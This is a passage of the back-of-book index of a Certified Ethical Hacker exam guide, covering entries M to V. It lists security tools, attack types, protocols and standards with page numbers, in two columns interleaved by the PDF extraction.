MD5 algorithm, 191, 418 OWASP top 10 risks, National Vulnerability Database
MD5 Calculator, 422 307–310 (NVD), 13
MDM (Mobile Device platform issues/problems, 308 NBT-NS, 210–211

Management), 313–314 platforms, 307, 311–315 nbtstat command, 127–128
Media Access Control. See MAC rooting/jailbreaking, 307, NCSC (National Computer Security
MEGA cloud service, 268 311–315 Center), 22–23
MegaPing, 115 smartphones. See smartphones NDA (nondisclosure agreement), 34
Meltdown attacks, 198, 399 social engineering attacks, Nessus, 15, 120–121, 242, 330
memory, flash, 423 468–469 Nest thermostat, 318
memory management attacks, Mobile Device Management net commands, 212

259–260 (MDM), 313–314 Net Tools, 115
message integrity codes (MICs), 187 mobile devices NetBIOS enumeration, 126–128
messenger channels, 468 applications, 308, 311, 313, 314 NetBIOS traffic, 210–211
Metasploit, 217–218, 255–256, 491 as attack platform, 316, 317 netcat tool, 126, 372, 375–376
methodologies, 102 attacks on, 307, 310, 311–317 Netcraft, 58, 241
MFA (multifactor authentication), 207 Bluetooth, 315, 316–317 Netcraft Extension, 467
MIB (Management Information BYOD, 307, 310, 313–314 NetCut, 316

Base), 128 cryptography, 308 netizens, 390
MIB attacks, 397 data storage, 308 Netscan, 93
MIB entries, 128 encryption, 434 NetScanTools Pro, 114
Microsoft, 122 evasion and, 118–119 netstat tool, 97, 132, 377–378, 390
Microsoft Azure, 345 Mobile Device Management, NetStumbler, 290, 291, 297
Microsoft Baseline Security Analyzer 313–314 network address translation (NAT),

(MBSA), 120, 270 operating systems, 307, 311–315 172–173, 398
Microsoft Management Consoles phishing, 315–316 Network Analysis, 115

(MMCs), 197 smartphones. See smartphones Network Basic Input/Output
Microsoft Vulnerability Research, 12 Trojans, 316 System. See NetBIOS
Microsoft Windows. vulnerabilities/risks, 307–315 network devices, 144–145

See Windows systems Wi-Fi connections, 314, 316 network diagrams, 102
MICs (message integrity codes), 287 Modbus, 334–335 network ID, 99, 101, 102, 104
Middleware Layer, 320 modbus-cli tool, 335 network indicators, 34, 35
mimikatz tool, 190 modulation, 280, 281 network interface cards (NICs),
Minecraft, 269 monero worm, 384 144–145, 147, 282
Mirai botnet, 269, 326, 327 msconfig tool, 379, 380 network intrusion detection systems.
mirroring websites, 242, 257 MTD (maximum tolerable See NIDSs
mis-association attack, 293 downtime), 18 Network layer, 7, 148
misconfiguration attacks, 28, 253 Mudge, Raphael, 397 Network News Transfer Protocol
misconfiguration vulnerabilities, 13 multicast, 152 (NNTP), 148
MITC (man-in-the-cloud) attack, 359 multicast messages, 145 network scan types, 108, 109
MITM (man-in-the-middle) attacks, multi-cloud model, 350 network tap, 168, 169

212, 327, 396, 442 multifactor authentication Network Time Protocol (NTP), 131
MITRE Corporation, 13 (MFA), 207 networks
MMCs (Microsoft Management multitier architecture, 245 ad hoc, 281–282, 293

Consoles), 197 MX records, 70 basics, 1–2, 5–15

17-Index.indd 573 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

CEH Certified Ethical Hacker All-in-One Exam Guide

574

networks (cont.) NTLM (NT LAN Manager), 191 IoT, 318–319
daisy-chaining, 16 NTLM authentication, 191, 192 misconfiguration, 14
edge computing, 345–346 NTLM hash, 192 OSI (Open Source Initiative), 239
footprinting, 79–81 NTP (Network Time Protocol), 131 OSI (Open System Interconnection)
IoT, 318–326 NTPv3, 128 Reference Model, 5–7
LTE, 294 nuclear worm, 385 OSINT (Open Source
monitoring, 159, 167, 168, 169 Nucleus RTOS, 319 Intelligence), 82
range, 79–80 NULL scan, 107 OSRFramework, 82
security zones, 11–12 NVD (National Vulnerability OSSTMM (Open Source Security
switched, 91 Database), 13 Testing Methodology Manual), 39
TCP/IP, 5, 7–12, 90–97 Ostinato tool, 93
VANET, 319 O OT (operational technology), 331–335
wireless. See wireless networks OT hacking, 331–335

New Technology File System. Oakley protocol, 398 OT Manufacturing Zone, 333
See NTFS obfuscator, 373 OUI (organizationally unique

NGINX servers, 243–246 object identifiers (OIDs), 128 identifier), 144–145
NICs (network interface cards), OCSP (Online Certificate Status out-of-band SQL injection, 267

144–145, 147, 282 Protocol), 425 overt channels, 374
NIDSbench tool, 175 OFDM (orthogonal frequency- OWASP (Open Web Application
NIDSs (network intrusion detection division multiplexing), 281 Security Project), 237, 239,

systems), 104–105, 167, 395 OIDs (object identifiers), 128 307–310, 320–325
Nikto scanner, 242 OmniPeek, 165, 297 OWASP Top 10 Cloud Security
Nirvanix, 352–353 one-factor authentication, 207 Risks, 354–355
NIST (National Institute of Online Certificate Status Protocol OWASP Top 10 Serverless Security

Standards and Technology), 332, (OCSP), 425 Risks, 355
350, 435 open loop systems, 333

NIST reference architecture, open services, 14
350–351 Open Source Initiative (OSI), 239 P

nmap command, 241–242, 438 Open Source Intelligence PaaS (Platform as a Service), 347
Nmap switches, 111–113 (OSINT), 82 packers, 374
Nmap tool, 111–114 Open Source Security Testing Packet (company), 345–346

considerations, 329 Methodology Manual Packet Builder, 93–94, 175
enumeration, 131, 241–242 (OSSTMM), 39 packet capture, 162–164
overview, 111 Open System Authentication, Packet Capture tool, 165
ping sweeps, 104, 105 284, 285 packet generating tools, 175
scanning, 241–242 Open System Interconnection (OSI) Packet Generator, 175, 176, 177

NNTP (Network News Transfer Reference Model, 5–7 packet header, 90
Protocol), 148 Open Visual Traceroute, 81 Packet Internet Groper. See ping

“no harm” clause, 31 Open Web Application Security packet-filtering firewalls, 173
nonce, 297 Project. See OWASP PackETH, 93, 175, 176, 177
nondisclosure agreement OpenOCD tool, 335 packets

(NDA), 34 OpenPGP standard, 437 considerations, 6, 7, 9
non-electronic password attacks, 209 OpenSezMe, 215 fragmented, 94, 116–117, 392
non-malware, 385–386 OpenSSL, 438, 439 ICMP, 104, 105, 393
nonrepudiation, 411, 415, 416, OpenVAS, 15, 121 identifying targets, 103–106

424–425 operational technology. See OT IP, 9–10, 107
noodling, 189–190 Orange Book, 23 PING, 104
NOP sled, 259 organizationally unique identifier routing, 117
NS records, 70 (OUI), 144–145 SYN, 393
NSA (National Security Agency), 22 Orion software, 130 SYN/ACK, 393
NSA wiretaps, 153 orthogonal frequency-division TCP, 396
NSAuditor, 128 multiplexing (OFDM), 281 UDP, 393
nslookup command, 77–78 Orwell, George, 155, 421 Pacu tool, 360–361
N-Stacker X scanner, 269 OS (operating system) Padding Oracle On Downgraded
NT LAN Manager. See NTLM attacks, 28, 334–335 Legacy Encryption (POODLE),
NTFS (New Technology File baseline, 13, 14 437–441

System), 220–221 default installation, 14 pairwise master key (PMK), 289
NTFS file streaming, 220–221 design flaws, 14 Panda Cloud Office Protection, 356
n-tier architecture, 245 fingerprinting, 102 parameter tampering, 251

17-Index.indd 574 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

Index

575

paranoid policy, 25 sniffing, 148, 209–216 physical security and, 478
pareidolia, 357 social engineering and, 208, 455 preparation phase, 36
Parrot OS, 123, 205–206 stored in cookies, 262 project scope, 488
partial knowledge testing, 36 strength, 208 reasons for, 35
passive footprinting, 53–56 tips for, 192 reconnaissance, 30
passive OS fingerprinting, 116 Windows systems, 190–195, 212 security assessment deliverables,
passive sniffing, 156, 157, 165 patches, 14, 219, 269–270 494–495
pass-the-hash attack, 194–195 Path Analyzer Pro, 81 security assessments, 487–494
Passware Kit, 212 payload, 16, 373 steps, 486–494
password attacks. Payment Card Industry Data Security target of evaluation, 36

See password cracking Standard (PCI DSS), 39, 351 terminology, 496–498
password cracking, 209–216 PayPal, 394 types of, 36–37

active online attacks, 209–212 PCI DSS (Payment Card Industry unannounced testing, 488
brute-force attacks, 214–215, 443 Data Security Standard), 39, 351 vulnerabilities, 13–14
Cain and Abel tool, 159, PCUnlocker tool, 212 white-box testing, 36, 488

212–213, 215, 296 PDQ Deploy, 219 pen tests, 35–36
cracking WEP, 295–297 PDU (protocol data unit), 6, 7, 90 penetration testing. See pen testing
cracking WPA, 295–297 pen testers. See also hackers PERA (Purdue Enterprise Reference
dictionary attacks, 214–216 considerations, 13, 31, 36, Architecture), 333
dumpster diving, 209 219, 490 permanent attacks, 393
Ettercap, 213 dumpster diving and, 30 permissive policy, 25
hybrid attacks, 214 vs. hackers, 31 personal identification numbers
John the Ripper, 215 interviewing, 35, 167–168 (PINs), 473, 476
keylogging, 210 job of, 32 personally identifiable information
Linux systems, 212, 215 “no harm” clause, 31 (PII), 16, 83
non-electronic attacks, 209 trust and, 35 perturbation attack, 327
offline attacks, 213–216 written agreements, 490 Petya virus, 383
passive online attacks, 212–213 pen testing, 485–502. PGP (Pretty Good Privacy), 437
rainbow tables, 214, 420 See also hacking PGPcrack, 443
resources, 215 agreements, 487–488 pharming, 466
rule-based attacks, 209 announced testing, 488 phishing
shoulder surfing, 209, 457 assessment, 26 e-mail, 210, 463–468
THC Hydra, 215 attack vs. defense, 489 mobile devices, 315–316
web attacks, 253 automated testing, 490 obtaining passwords via, 210
web servers, 254 automated testing tools, spear phishing, 359, 374,
Windows systems, 190–195, 490–491 466–467

210–215 black-box testing, 36, 488 voice phishing, 457
password guessing, 209 CANVAS, 490–491 PhishTank, 467
password policy, 25 cleanup, 492 phlashing, 393
passwords, 206–216 color designation, 488–489 phreakers, 26

application layers and, 148 conclusion, 36 physical controls, 17
attacks. See password cracking considerations, 32, 487, physical hardening, 321
authentication and, 207–216 489–490, 492 Physical layer, 5, 7
changing, 476 Core Impact, 490–491 physical security, 472–479
clear text, 148 cost of, 490–491 access controls, 474–477
community string, 128–129 deliverables, 492 basics, 472–477
complexity, 194, 208 described, 487 biometric identifiers, 207, 208,
considerations, 20, 206–209, evidence of crime during, 474, 475

476, 477 492–493 bump key, 478
cracking. See password cracking gray-box testing, 36, 488 considerations, 17, 30, 472
death of, 475 guidelines, 496 described, 472
default, 14, 28, 209, 215, 334 vs. hacking, 57 hacks, 478–479
forgotten, 266 length of, 490 IoT devices, 321
hashed, 191–195, 419–420 manual testing, 491 locks, 472, 474, 476, 478
IoT and, 321 Metasploit, 491 mantraps, 476–477
keyboard walks, 208 methodology, 486–494 operational measures, 473
length, 194, 208 “no harm” clause, 31 pen testing and, 478
Linux systems, 200, 201, 212 overview, 35–36, 485–486 physical measures, 472–473
obtaining by asking for, 455 pen test phases, 36 technical measures, 473

17-Index.indd 575 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

CEH Certified Ethical Hacker All-in-One Exam Guide

576

piggybacking, 267, 457 PP (protection profile), 23 described, 424
PII (personally identifiable Presentation layer, 6, 7 digital signatures and, 432–433

information), 16, 83 Pretty Good Privacy (PGP), 437 PKI and, 424–427, 433
ping, 104, 105, 393 preventive controls, 18 public zone, 173
ping of death, 393 PRISM (Planning Tool for Resource pulse wave attacks, 393
PING packets, 104 Integration, Synchronization, and Purdue Enterprise Reference
ping sweeps, 104–105 Management), 154 Architecture (PERA), 333
PINs (personal identification privacy issues Purdue Model, 333

numbers), 473, 476 health information, 39 purple team, 489
PKI (public key infrastructure), 416, IoT, 321 PUT method, 249

424–433 laws/standards, 37 pwdump7 tool, 190
PKI system, 424–433 personal identification numbers, “pwning,” 253
plain text, 20–21, 410, 411 473, 476
plain-text attacks, 441–442 personally identifiable Q
Planning Tool for Resource information, 16, 83

Integration, Synchronization, and Samsung smart TV, 220–221 QoS (quality of service), 148
Management (PRISM), 154 U.S. government, 420–421 quality of service (QoS), 148

Platform as a Service (PaaS), 347 private cloud model, 349 Qualys Cloud Suite, 356
PLC (programmable logic private keys Qualys tool, 15

controller), 334 asymmetric encryption, 415–416 quasi-encryption, 424
PMK (pairwise master key), 289 considerations, 424, 438, 439
PNZ (production network zone), 12 described, 424 R
POC (point of contact), 76, 79–80 digital signatures and, 432–433

Radare2 tool, 335
point of contact (POC), 76, 79–80 PKI and, 424–426, 433

radio waves, 5
Poison Ivy, 392 private zone, 173

RADIUS servers, 284, 287
PoisonVirus Maker, 380 privileges

rainbow tables, 214, 420
policies, security, 24–25 administrator, 216–219, 497

RAM, 423
Polybius square, 409–410 considerations, 497

ransomware, 268, 327, 380–384, 390
POODLE (Padding Oracle On escalation of, 31, 36, 216–218

RAs (registration authorities), 425, 427
Downgraded Legacy Encryption), root, 216–219

RC (Rivest Cipher), 414
437–441 procedures, 25

RC4 algorithm, 285, 286, 439–440
POP3 (Post Office Protocol 3), 148 Process Explorer, 379

RCPT TO command, 131
pop-up windows, 466, 467, 469 processors, 238, 399, 424

Ready Player One, 63
pornography, 492–493 production network zone (PNZ), 12

RealSense OS X, 319
port address translation, 172 programmable logic controller

reconnaissance, 51–88.
port number reservations, 95 (PLC), 334

See also footprinting
port numbers, 70, 94–97, 376–378 Project Honey Pot, 179

described, 30
port scan types, 106–110 promiscuous mode, 145

DNS, 67–78
port sweeping, 113 promiscuous policy, 25

e-mail/websites, 66–67
Portable Penetrator, 296 protection profile (PP), 23

vs. footprinting, 52
PortDroid, 115 protection rings, 225–226

networks, 79–81
ports protocol attacks, 392, 393

search engines, 57–66
closed, 106, 108–109 protocol data unit (PDU), 6, 7, 90

Recon-ng, 242
considerations, 96 proxies, 102, 117–119

red team/red teaming, 489
dynamic, 95 proximity badge, 473

regedit.exe, 197
important port numbers, 95 proxy chains, 117–118

regedt32.exe, 197
listening for, 96 proxy server Trojans, 375

regional Internet registries (RIRs), 74
mirroring, 156 PRTG Network Monitor, 115

registration authorities (RAs), 425, 427
open, 102 prudent policy, 25

registry, 195–197, 222, 223, 379
registered, 95 pseudonymous footprinting, 53

registry hacking, 196–197
scanning, 106–116 pseudorandom number, 92

registry information, 79
security, 157, 161 PSH flag, 92

regulatory efforts, 351
span, 156 Psiphon, 119

remote access Trojans, 375
states, 96–97 PTR records, 70

Remote Exec, 219
TCP/IP, 378 public cloud model, 349

replay attacks, 212, 442
UDP, 110, 378 public key infrastructure. See PKI

Requests For Comments (RFCs), 236
well-known, 95, 96 public keys

Réseaux IP Européens (RIPE) NCC,
POST method, 249 asymmetric algorithms, 416

74, 75
Post Office Protocol 3 (POP3), 148 asymmetric encryption, 415–416

resource identifiers (RIDs), 122, 123
power issues, 473 considerations, 424–425, 427

17-Index.indd 576 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

Index

577

Responder, 211 SAST (Static Application Security Linux systems, 193–203
reverse engineering, 309 Testing), 238 mobile. See mobile computing
reverse social engineering, 458 SCADA (supervisory control and operational technology,
RFCs (Requests For Comments), 236 data acquisition) systems, 332, 334–335
RFID features, 476 334–335 organizations promoting,
RFID identify theft, 457–458 scalar objects, 128 236–240
RFID skimming, 457–458 scanning, 89–121 patches, 14, 219, 269–270
RIDs (resource identifiers), 122, 123 connectionless, 108–109 physical. See physical security
RIOT OS, 319 considerations, 105–106 port, 157, 161
RIPE (Réseaux IP Européens) NCC, described, 90 threats to. See threats

74, 75 evasion, 116–119 Unix systems, 123–124
RIPEMD-160 hash, 419 examples of, 30 Windows systems, 190–198
RIRs (regional Internet registries), 74 vs. footprinting, 90 wireless networks, 282, 284–289
risk. See also vulnerabilities identifying targets, 103–106 Security Accounts Manager.

assessment, 13, 14 naming conventions, 107 See SAM
considerations, 27, 30, 35 port, 106–116 security analysts, 26
management, 17 SCTP, 110 Security as a Service (SECaaS), 348
quantifying dangers of, 13 stealth attacks, 219–226 security assessment deliverables,

risk analysis matrix, 17 tools for, 106–116, 317 494–495
Rivest Cipher (RC), 414 Windows scans, 113 security assessments, 487–494
Rivest, Ronald, 418 ZenMap, 104 security audits, 487
roaming, 282 scanning methodology, 102–121 security breaches, 268
robots.txt file, 241 SCAP (Security Content Automation Security Center, 120
rogue access points, 282, 291, Protocol), 13 Security Content Automation

292–293 Schneider Electric, 334 Protocol (SCAP), 13
Rogue Security, 466 Schnier, Bruce, 443 security context, 122
rolling code attack, 327 Scientology website attacks, 394 security controls, 14, 17, 35–36
root CAs, 427, 432 ScoopLM, 213 Security Focus, 12
root privileges, 216–219 scope, 153 Security, Functionality, and Usability
rooting, 307, 311–315 Scranos rootkit, 225 triangle, 15, 16, 28
rootkits, 224–226 screened subnet, 173 security identifiers (SIDs), 122, 123
Roots of Trust (RoT), 353 script kiddies, 26, 27 security incident and event
RoT (Roots of Trust), 353 SCTP (Stream Control Transmission management (SIEM), 31
round cipher, 414 Protocol), 110 security logs, 223
routed protocols, 101 SCTP COOKIE Scanning, 110 Security Magazine, 12
routers, 1–2, 10, 159 SCTP INIT scanning, 110 Security Operation Center (SOC), 31
routing protocols, 101 search engines, 57–66 security policies, 24–25
rpcclient tool, 124 Firefox, 440 security target (ST), 23
rpcinfo tool, 124 footprinting and, 57–66 security zones, 11–12
RSA algorithm, 416, 436 Google. See Google entries SEF (Social Engineering
RSA key, 437 listed, 57 Framework), 82
RST flag, 92 mapping/location tools, 58 segments, 6, 7, 90
RST packets, 107–108 overview, 57–58 self-signed certificates, 432
RUDY (R-U-Dead-Yet), 394 Shodan, 64–66, 327–329, 334 semagrams, 222
rule-based attacks, 209 SEC Info, 55 sequence attacks, 395–397

SECaaS (Security as a Service), 348 sequence numbers (SNs), 396

S Secure Shell (SSH), 436 serial number, zone file, 72
Secure Sockets Layer. See SSL Serpent encryption, 414

SaaS (Software as a Service), 347 Secure/Multipurpose Internet Mail servers
safety instrumented systems (SIS), 334 Extensions (S/MIME), 437 Apache, 243, 245–247
Salesforce, 344 security application, 243
salt/salting, 192, 202, 420 applications, 237–239 authoritative, 71
SAM (Security Accounts Manager), auditing, 25 DHCP, 159–160

190–195 basics, 15–25 DNS, 68–78, 292, 326
SAM database, 123, 191 cloud, 352–363 e-mail, 77
SAM files, 190–195 considerations, 441 Google, 440
Sam’s Virus Generator, 380 fundamentals, 2–25 HTTPS, 441
SamSam virus, 383, 390 laws/standards, 37–42 IIS, 243, 244, 245
Sarbanes-Oxley (SOX) Act, 39 layered, 477 Linux, 198

17-Index.indd 577 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

CEH Certified Ethical Hacker All-in-One Exam Guide

578

servers (cont.) SIS (safety instrumented systems), 334 network interface cards and,
name, 70–71, 74, 78 Sisyphean activities, 254–255 144–145
name resolvers, 71 site local scope, 152, 153 passive, 156, 157, 165
NGINX, 243–246 SLAs (service level agreements), 488 passwords, 148, 209–216
NTP, 131 SLE (single loss expectancy), 18 protocols, 147–153
RADIUS, 284, 287 Slowloris tool, 394 STP attacks, 162
sinkhole, 384 SMAC tool, 295 techniques, 157–162
SOA, 77 smart watches, 317, 319 tools, 162–165
unpatched, 14 smartcards, 476 viewing ARP entries, 150–151
web. See web servers smartphones. See also mobile devices wireless, 297–298

service level agreements (SLAs), 488 Android. See Android phones wiretapping, 153–154
Service Name and Transport Protocol attack methodologies, 307 Sniff-O-Matic, 165

Port Number Registry, 95 Blackberry phones, 311 SNMP (Simple Network
service set identifier (SSID), 282, 284 considerations, 306 Management Protocol), 128–129
service-oriented architecture. See SOA iPhone. See iPhones SNMP enumeration, 128–129
session fixation attack, 261 vulnerabilities/risks, 307, SNMPv1, 148
session hijacking, 395–399 314–315 Snort, 165
session IDs, 261 wireless hacking and, 280, 290 Snort IDS, 167–172
Session layer, 6, 7 “smashing the stack,” 259–260 Snowden, Edward, 421
session management, 237 SMB exploit, 383–384 SNs (sequence numbers), 396
session riding, 359 SMB vulnerability, 383–384 SOA (service-oriented
session splicing, 175 S/MIME (Secure/Multipurpose architecture), 358
SHA-1 algorithm, 419 Internet Mail Extensions), 437 SOA records, 70, 72
SHA-2 algorithm, 419 Smith, Zachary, 346 SOA server, 77
SHA-3 algorithm, 419 SMS messages, 468, 469 SOAP (Simple Object Access
shadow files, 200, 202 SMS phishing, 315–316 Protocol), 259
shadow IT, 356 SMTP (Simple Mail Transfer SOAP injection, 259
Shadowsocks, 118–119 Protocol), 131, 147 SOC (Security Operation Center), 31
Shared Key Authentication, SMTPCheck, 129 social engineering, 454–472

284, 285 SMTPv1, 129 authority support, 457
shared key encryption, 413–415 SMTPv3, 128, 129 clickjacking, 373–374
Shark, 392 Smurf attacks, 393 computer-based attacks,
sheepdip system, 390 Sniffer Wicap, 165 462–468
shell injection, 258 sniffers defined, 455
ShellShock, 256 Cain and Abel tool, 159, 212–213, described, 56
Shodan, 64–66, 327–329, 334 215, 296 disgruntled employees, 59–60,
shoulder surfing, 209, 457 Capsa Network Analyzer, 165 460–462
shredders, 456 Ettercap, 165, 213, 397 dumpster diving, 54, 55, 57,
shrink-wrap code attacks, 28 IoT traffic, 331 209, 456
side-channel attacks, 359, 442 OmniPeek, 165 eavesdropping, 457
SIDs (security identifiers), 122, 123 Packet Capture, 165 as footprinting tool, 54, 56
SIEM (security incident and event promiscuous mode, 145 “halo effect,” 458

management), 31 Sniffer Wicap, 165 human-based attacks, 456–462
signature files, 390 Sniff-O-Matic, 165 identity theft, 457–458, 470–471
signature list, 166 Snort, 165 impersonation, 456–457
signed certificates, 432 SteelCentral Packet Analyzer, 165 insider threats, 460–462
sign-in seal, 467 tcpdump tool, 164–165 Maltego tool, 82
SIGVERIF tool, 389 WinDump tool, 164–165 mobile devices, 315–316
Simple Mail Transfer Protocol Wireshark, 162–165 mobile-based attacks, 468–469

(SMTP), 131, 147 sniffing, 143–165 obtaining passwords, 208, 455
Simple Network Management active, 156–159 OSRFramework, 82

Protocol. See SNMP ARP poisoning, 158–159 overview, 454–455
Simple Object Access Protocol basics, 143–155 phases of, 455

(SOAP), 259 collision domains, 145–147, 156 phishing e-mail/attacks, 463–468
single key encryption, 413–415 described, 144 piggybacking, 457
single loss expectancy (SLE), 18 firewalls, 172–174 preventing, 469–471
single-authority system, 427 IPv6 and, 151–153 real world, 459–460
sinkhole server, 384 MAC flooding, 157–158 reverse, 458
Sirefef rootkit, 225 network devices and, 144–147 SEF tool, 82

17-Index.indd 578 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

Index

579

shoulder surfing, 209, 457 Start of Authority server, 77 system attacks, 189–233.
social networking and, 462–463 stateful inspection, 173 See also attacks
tailgating, 457 state-sponsored hackers, 27 “bricking,” 393
technical support, 457, 458 Static Application Security Testing causing permanent damage
training users on, 469 (SAST), 238 to, 393
whaling, 466 static electricity, 473 checking for live systems, 102
why it works, 455 stealth attacks, 219–226 covering/clearing tracks, 31, 204,

Social Engineering Framework stealth scan, 106, 109 219, 222–224
(SEF), 82 stealth software, 226 enumeration. See enumeration

social networking, 462–463 SteelCentral Packet Analyzer, 165 executing applications, 218–219
social networking sites, 56, 59–60 steganography, 222, 410, 422–423 gaining access, 30
social skills, 63–64 stego-files, 422–423 getting started, 190–206
SOCKS5 protocol, 119 Steinberg, Joseph, 438 maintaining access, 30–31, 205
Softerra, 130 STP (Spanning Tree Protocol), 162 methodology, 203–206
Software as a Service (SaaS), 347 STP attacks, 162 “owning” a system, 218–219
SolarWinds, 130 stream ciphers, 412, 413 password cracking, 209–216
SolarWinds Traceroute NG, 81 Stream Control Transmission phases, 29–32, 203–205
Sonic Bat, 380 Protocol (SCTP), 110 privilege escalation, 31, 36,
Sony PlayStation network attacks, 394 Structured Query Language. See SQL 216–218
source host, 72 Stuxnet code, 385 reconnaissance. See reconnaissance
source routing, 117 subnet ID, 99 scanning. See scanning
SOX (Sarbanes-Oxley) Act, 39 subnet mask, 98 stealth attacks, 219–226
spam e-mail, 179, 374 subnetting, 10, 98–102 system logs, 223
span ports, 156 substitution, 412 systems, “live,” 102
Spanning Tree Protocol. See STP suicide hackers, 27
spear phishing, 359, 374, 466–467 Sunburst malware, 129–130 T
Spectre attacks, 198, 399 Super Bluetooth Hack, 317
spectrum analyzer, 282 SuperScan, 116 tabular objects, 128
SpiderFoot, 242 supervisory control and data tactics, techniques, and procedures
spiders, 58–59, 82 acquisition (SCADA) systems, 332, (TTPs), 33–34
spimming, 466 334–335 tailgating, 457
spoof attacks, 392 supply chain attacks, 268 Tails OS, 119
Spoofcard, 76 SwayzCryptor, 374 target of evaluation (TOE), 23, 36
spoofing switch port stealing, 158 Task Manager, 379

considerations, 76 switched networks, 91 TCG (Trusted Computing
IP addresses, 107, 116–117 switches Group), 353
IRDP, 161 collision domains, 147 TCP (Transmission Control
MAC addresses, 158, considerations, 154, 212 Protocol), 10, 91, 148

160–161, 295 Hping, 115 TCP communication, 395–397
overview, 160 MAC flooding, 158 TCP connect scan, 106, 109

spyware, 209 Nmap, 111–113 TCP flags, 92–94, 106–107
SQL (Structured Query Language), sniffing and, 156, 157, 158, 161 TCP Maimon, 107

263–267 Sybil attack, 326 TCP segment structure, 92
SQL injection, 263–267 Syhunt Hybrid scanner, 269 TCP session hacking, 395–396
SQLBrute, 267 Symantec Drive Encryption, 434 TCP state-exhaustion attacks, 393
sqlmap scanner, 267 symmetric encryption, 413–415, 434 TCP streams, 162
sqlninja scanner, 267 SYN (Synchronize segment), 9, 396 tcpdump tool, 164–165
“squirreling,” 345–346 SYN attacks, 393 TCP/IP networks, 5, 7–12, 90–97
SRV records, 70 SYN flag, 92, 93, 107 TCP/IP ports, 378
SSH (Secure Shell), 436 SYN floods, 393 TCP/IP stack, 6, 8
SSH brute-force attacks, 253 SYN packets, 393 tcptrace tool, 165
SSID (service set identifier), 282, 284 SYN scan, 106 TCSEC (Trusted Computer System
SSID cloaking, 284 SYN segments, 175 Evaluation Criteria), 23
SSL (Secure Sockets Layer), 213, SYN, SYN/ACK, ACK handshake, TEA (Tiny Encryption

436, 437–441 9–10 Algorithm), 414
SSL sites, 213 SYN/ACK packets, 107–108, 393 teardrop attacks, 393
ST (security target), 23 SYN/ACK segment, 9, 10, 396 technical controls, 17
stack, 259 Synchronize segment. See SYN technical support social engineering,
standards, 22, 25, 37–42 system administrators. 457, 458
Start of Authority records, 70, 72 See administrators technorati, 390

17-Index.indd 579 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

CEH Certified Ethical Hacker All-in-One Exam Guide

580

Teleport Pro, 66 Trinity tool, 394 Unified Extensible Firmware
Telnet Tripwire, 389 Interface (UEIF), 225

banner grabbing, 125, 126 Trivial FTP (TFTP), 62, 148 Uniform Resource Identifier
considerations, 131, 331, 376, 436 Trivy scanner, 360 (URI), 247
IoT and, 330–331 Trojans, 375–379 Uniform Resource Locator. See URL
password attacks, 255, 272 vs. backdoors, 375 Unix systems

Telnet sessions, 162–163 botnet, 375 basics, 123–124
temperature, 473 command shell, 375 considerations, 123
Temporal Key Integrity Protocol considerations, 209, 375–376 enumeration, 123–124

(TKIP), 287 countermeasures, 379 whois tool, 74, 84
Tenable products, 15, 120, 330 defacement, 375 update mechanism, 321
terminology, 16, 26–34 described, 375 UPnP ports, 331
TFTP (Trivial FTP), 62, 148 downloaders, 373 URG flag, 92
TGS (Ticket Granting Service), 193 droppers, 373 URI (Uniform Resource
TGT (Ticket Granting Ticket), 193 e-banking, 375 Identifier), 247
THC Hydra, 215, 254 EliteWrap, 374 URL (Uniform Resource Locator),
The Onion Routing (TOR), 118 mobile devices, 316 247, 257, 260
thermostats, 317, 318, 319 monitoring services/processes, 379 URL tampering, 251
Thingful tool, 329 Netcat and, 375–376 U.S. government, 385, 419,
threat modeling, 16 port numbers, 376–378 420–421, 443
threats. See also vulnerabilities proxy server, 375 usability, 15, 16, 441

cloud computing, 354–358 remote access, 375 USB, bootable, 434
disgruntled employees, 59–60, tools for, 377–379 USB drives, 436

460–462 types of, 375–377 USB encryption, 424
insider, 460–462 Windows systems, 377–379 USB wireless adapter, 290
organizational assets, 17 trust model, 427 User Behavior Analytics (UBA), 19

three-factor authentication, 207 trust systems, 427 User Datagram Protocol. See UDP
three-way handshake, 9–10, 92, Trusted Computer System Evaluation user ID (Windows), 123

93, 397 Criteria (TCSEC), 23 user IDs (UIDs), 21, 124
Ticket Granting Service (TGS), 193 trusted computing, 353 Userland exploit, 312
Ticket Granting Ticket (TGT), 193 Trusted Computing Group
tiger team, 35 (TCG), 353 V
time to live (TTL), 72 trusted platform module (TPM), 424
Tiny Encryption Algorithm Truth in Caller ID Act, 76 V2V (vehicle-to-vehicle) data

(TEA), 414 T-sight tool, 397 exchange, 319
TKIP (Temporal Key Integrity TTL (time to live), 72 V2X (vehicle-to-everything), 288

Protocol), 287 TTPs (tactics, techniques, and VA (validation authority), 425, 432
TLS (Transport Layer Security), 436, procedures), 33–34 validation authority (VA), 425, 432

439, 441 tunnel mode, 398 VANET (Vehicle Ad Hoc
TMAC tool, 295 Twitter, 59, 314, 462 Network), 319
TOE (target of evaluation), 23, 36 two-factor authentication, 207, 468 VB script, 375
tokens, 208, 475, 476 Twofish encryption, 414 Vehicle Ad Hoc Network
TOR (The Onion Routing), 118 (VANET), 319
TPM (trusted platform module), 424 vehicle communications, 288

U
TRACE method, 249 vehicles, 319, 327, 345
traceroute tools, 80–81 UBA (User Behavior Analytics), 19 vehicle-to-everything (V2X), 288
tracert tool, 80, 81 Ubuntu Core, 319 vehicle-to-vehicle (V2V) data
Trakz, 330 UDP (User Datagram Protocol), 10, exchange, 319
Transmission Control Protocol. 91, 148 VFS (virtual file system), 225

See TCP UDP flood attacks, 393 video games, 269
transmit malware, 374 UDP packets, 393 virtual file system (VFS), 225
Transport layer, 6, 7, 148 UDP ports, 108, 110, 378 virtual machines (VMs), 344, 346
Transport Layer Security (TLS), 436, UDP scan, 108 virtualization, 344

439, 441 UEIF (Unified Extensible Firmware virus hoax, 380
transport mode, 398 Interface), 225 virus making software, 380
transposition, 412 UIDs (user IDs), 21, 124 viruses, 379–384. See also
trash intelligence, 456 Ultrasurf, 119 AV entries; worms
